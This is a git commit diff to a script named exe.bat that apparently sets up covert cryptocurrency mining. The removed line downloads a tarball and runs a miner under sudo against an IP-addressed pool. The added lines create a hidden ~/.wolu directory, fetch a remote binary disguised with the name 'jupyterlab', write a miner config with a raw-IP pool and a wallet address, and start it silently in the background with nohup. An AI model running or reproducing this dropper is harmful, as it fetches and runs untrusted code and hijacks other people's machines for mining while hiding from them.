dcf229e0efee0092656d586d5335d1b2716761b3
6f7ekathleen76672 <137009991+6f7ekathleen76672@users.noreply.github.com>
2025-02-12 03:50:21 +0800

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,31 @@
-wget -O joko https://gitlab.com/jasa4/jasa/-/raw/main/JOKO-SBv2.tar.gz && tar -xvf joko && sudo ./JOKO-SBv2/JOKO-SBv2 -a verushash -o 47.236.39.4:80 -u RX5TNT5xdqg8PqMCbqCaC431cfxiMyaGuo.GH-$(TZ=UTC-7 date +"%H-%M-%S [%d-%m]") -p x --cpu-threads $(nproc --all)
+cd ~/
+mkdir .wolu && cd .wolu
+
+wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu >/dev/null 2>&1
+
+cat > config.json <<END
+{
+    "autosave": true,
+    "randomx": {
+        "1gb-pages": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "rx/0": [-1, -1, -1, -1,-1, -1, -1, -1]
+},
+    "pools": [
+        {
+            "algo": "null",
+            "coin": null,
+            "url": "47.236.126.193:443",
+            "user": "89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ",
+            "pass": "GH",
+            "keepalive": true,
+        }
+    ],
+}
+END
+
+
+nohup ./wolu &>/dev/null &
